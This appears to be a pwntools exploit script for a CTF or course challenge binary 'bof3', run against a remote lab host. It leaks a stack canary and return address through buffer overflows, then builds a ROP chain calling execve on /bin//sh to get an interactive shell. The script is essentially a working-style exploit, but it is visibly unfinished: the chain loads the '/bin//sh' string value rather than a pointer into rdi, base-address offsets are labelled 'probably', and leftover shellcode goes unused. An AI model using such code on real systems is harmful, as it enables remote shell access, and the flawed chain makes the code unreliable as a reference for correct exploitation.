#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#return address maybe 8 more, canary correct (need to go next)
from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './bof3'
port = 10261

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
else:
    r = remote('up.zoolab.org', port)

shellcode = """
xor rax, rax
push rax
mov rdi, 0x68732f2f6e69622f
push rdi
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 59
syscall
"""
# 32 byte + return address (16 A, 16 A, return address (msg))

# GET canary
payload = 'A'*41
r.recvuntil(b"name? ")
r.send(payload)
#num41 is 00
out = r.recvline().strip()

padding = b'A' * 41
split_position = out.find(padding) + len(padding)
out = b'\x00' + out[split_position:]  
out1 = out[0:8]
out2 = out[8:]
hex_out = ''.join(f"{byte:02x}" for byte in out)
print("all: ", hex_out)
hex_out = ''.join(f"{byte:02x}" for byte in out1)
print("can: ", hex_out)
hex_out = ''.join(f"{byte:02x}" for byte in out2)
print("add: ", hex_out)


# get return address
r.recvuntil(b"number? ")
payload = 'A' * 56
r.send(payload)
out = r.recvline().strip()
padding = b'A' * 56
split_position = out.find(padding) + len(padding)
out = out[split_position:]  

out = out.ljust(8, b'\x00')
# address is original return address
address = unpack(out, 'all', endian='little')
print(f'Out: {out}\tAddress: {address:#018x}')

# base address (probably)
address -= 0x6c
address -= 0x8a64

#-----------------------------------------------------------------------------------------------------#


print(f"new_address: {address:#018x}")
import struct
padding = b"A" * 40


#TODO: set address to rop chain start address
#packed_address = struct.pack("<Q", address)

base_address = address


# 构建ROP链
rop = ROP(elf)

pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0] + base_address
rop.raw(pop_rdi_ret)
rop.raw(0x68732f2f6e69622f)


# need mov rdi, rsp 

# 清零rax, rdx
pop_rax_rdx_rbx_ret = next(elf.search(asm('pop rax; pop rdx; pop rbx; ret'))) + base_address
rop.raw(pop_rax_rdx_rbx_ret)
rop.raw(0)  # rax
rop.raw(0)  # rdx
rop.raw(0)  # rbx (dummy value)

# 设置rax为59
pop_rax_ret = rop.find_gadget(['pop rax', 'ret'])[0] + base_address
rop.raw(pop_rax_ret)
rop.raw(59)  # sys_execve

# 清零rsi
pop_rsi_ret = rop.find_gadget(['pop rsi', 'ret'])[0] + base_address
rop.raw(pop_rsi_ret)
rop.raw(0)  # rsi

# 执行syscall
syscall = next(elf.search(asm('syscall'))) + base_address
print(f"{(syscall - address):#018x}")
rop.raw(syscall)


print(rop.dump())
# 发送溢出载荷

payload = padding + out1 + b"A"*8 + rop.chain()


print(payload)

#-----------------------------------------------------------------------------------------------------#

r.recvuntil(b"name? ")
r.sendline(payload)

r.recvuntil(b"message: ")
r.send(payload)
r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa